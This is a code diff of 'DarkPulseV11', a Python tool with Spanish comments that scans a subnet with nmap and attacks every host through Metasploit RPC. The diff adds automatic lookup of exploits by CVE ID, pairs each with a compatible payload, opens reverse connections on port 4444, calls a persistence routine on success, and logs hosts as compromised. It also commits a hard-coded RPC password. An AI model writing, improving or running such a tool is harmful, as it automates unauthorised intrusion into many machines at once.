@@ -2,6 +2,9 @@
 import requests
 import nmap
 import json
+from concurrent.futures import ThreadPoolExecutor
+from pymetasploit3.msfrpc import MsfRpcClient
+#from metasploit import msfrpcclient
 import socket
 import subprocess
 import time
@@ -9,14 +12,14 @@ import threading
 import logging
 from datetime import datetime
 # Import defensivo: si no tienes metasploit RPC instalado, el script no fallará al importar.
-try:
+"""try:
     from metasploit import MsfRpcClient
     _HAS_MSFRPC = True
 except Exception:
     MsfRpcClient = None
     _HAS_MSFRPC = False
 
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor"""
 
 class DarkPulseV11:
     def __init__(self, rango_ip, metasploit_pass="tu_contraseña", max_threads=10):
@@ -154,28 +157,67 @@ class DarkPulseV11:
     def explotar_vulnerabilidad(self, ip, puerto, vulnerabilidad_id):
         print(f"[*] Intentando explotar {vulnerabilidad_id} en {ip}:{puerto}")
         self.logger.info(f"Intentando explotar {vulnerabilidad_id} en {ip}:{puerto}")
+
         try:
             client = MsfRpcClient(self.metasploit_pass)
-            exploit = client.modules.use("exploit", f"unix/webapp/cve_{vulnerabilidad_id.lower().replace('-', '_')}")
-            exploit["RHOSTS"] = ip
-            exploit["RPORT"] = puerto
-            payload = client.modules.use("payload","cmd/unix/reverse_python")
-            payload["LHOST"] = socket.gethostbyname(socket.gethostname())
-            payload["LPORT"] = 4444
-            resultado = exploit.execute(payload=payload)
-            if resultado.get("job_id"):
-                print(f"[!] ¡Éxito! Acceso total en {ip}:{puerto}")
-                self.logger.info(f"Éxito en explotación: {ip}:{puerto}")
-                self.dispositivos_vulnerables.append(ip)
-                self.establecer_persistencia(ip)
-                return True
-            else:
-                print(f"[-] Fallo en la explotación de {ip}:{puerto}")
-                self.logger.warning(f"Fallo en explotación: {ip}:{puerto}")
+
+            # 1. Busca exploits en la base de datos de Metasploit por el ID de la vulnerabilidad
+            # Se usa una búsqueda genérica para encontrar módulos que contengan el CVE ID
+            search_results = client.call('module.search', f'cve:{vulnerabilidad_id}')
+            
+            # 2. Filtra solo los módulos de tipo 'exploit'
+            exploits_found = [
+                result['fullname'] for result in search_results['modules']
+                if result['type'] == 'exploit'
+            ]
+
+            if not exploits_found:
+                print(f"[-] No se encontraron exploits en Metasploit para {vulnerabilidad_id}")
                 return False
+                
+            # 3. Itera sobre los exploits encontrados y prueba cada uno
+            for exploit_module in exploits_found:
+                print(f"[*] Probando el exploit: {exploit_module}")
+                try:
+                    exploit = client.modules.use('exploit', exploit_module)
+                    
+                    # 4. Busca payloads compatibles
+                    compatible_payloads = client.call('module.compatible_payloads', exploit_module)
+                    if not compatible_payloads:
+                        continue
+
+                    # 5. Selecciona el primer payload compatible (podrías añadir lógica más avanzada aquí)
+                    payload_module = compatible_payloads[0]
+                    payload = client.modules.use('payload', payload_module)
+
+                    # AÑADE ESTAS DOS LÍNEAS AQUÍ:
+                    print(f"[*] Usando exploit: {exploit_module}")
+                    print(f"[*] Usando payload: {payload_module}")
+                    
+                    # 6. Configura y ejecuta
+                    exploit['RHOSTS'] = ip
+                    exploit['RPORT'] = puerto
+                    payload['LHOST'] = socket.gethostbyname(socket.gethostname())
+                    payload['LPORT'] = 4444
+
+                    resultado = exploit.execute(payload=payload)
+                    if resultado.get("job_id"):
+                        print(f"[!] ¡Éxito! Acceso total en {ip}:{puerto} con el exploit {exploit_module}")
+                        self.logger.info(f"Éxito en explotación: {ip}:{puerto} con {exploit_module}")
+                        self.dispositivos_vulnerables.append(ip)
+                        self.establecer_persistencia(ip)
+                        return True
+                    else:
+                        print(f"[-] Fallo en la explotación de {ip}:{puerto} con {exploit_module}")
+                
+                except Exception as e:
+                    print(f"[-] Error al probar {exploit_module}: {e}")
+                    
+            return False
+            
         except Exception as e:
-            print(f"[-] Error en explotación: {e}")
-            self.logger.error(f"Error en explotación: {e}")
+            print(f"[-] Error general en la explotación: {e}")
+            self.logger.error(f"Error general en la explotación: {e}")
             return False
 
     def establecer_persistencia(self, ip):
@@ -239,11 +281,22 @@ ____/ /_  ___  ____  _   __/ /_  ___  __
       ⚡️ DarkPulseV11: Escáner de Red ⚡️
       🔓 Buscando vulnerabilidades... 🔍
             Por: SpiritNetGhost
+                .--.          .--.
+               |o_o |      /  .--. \
+               |:_/ |     |  /____\ |
+              //   \\     \ / __ \ /
+             (|     |)     `"`----`"`
+              /`\_   _/`\    _.-._
+              `"==`"`=="`"  | | | |
+               |  ---  |
+               |       |
+               |_______|
 """
         print(banner)
 
         start_time = time.time()
         dispositivos = self.escanear_red()
+        
         with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
             futures = []
             for ip in dispositivos:
@@ -256,5 +309,5 @@ ____/ /_  ___  ____  _   __/ /_  ___  __
         print(f"[!] Operación completada en {time.time() - start_time:.2f} segundos. Dispositivos comprometidos: {self.dispositivos_vulnerables}")
         self.logger.info(f"Operación completada. Dispositivos comprometidos: {self.dispositivos_vulnerables}")
 if __name__ == "__main__":
-    darkpulse = DarkPulseV11(rango_ip="192.168.1.168/24", metasploit_pass="tu_contraseña", max_threads=10)
+    darkpulse = DarkPulseV11(rango_ip="192.168.1.168/24", metasploit_pass="155350", max_threads=10)
     darkpulse.ejecutar()
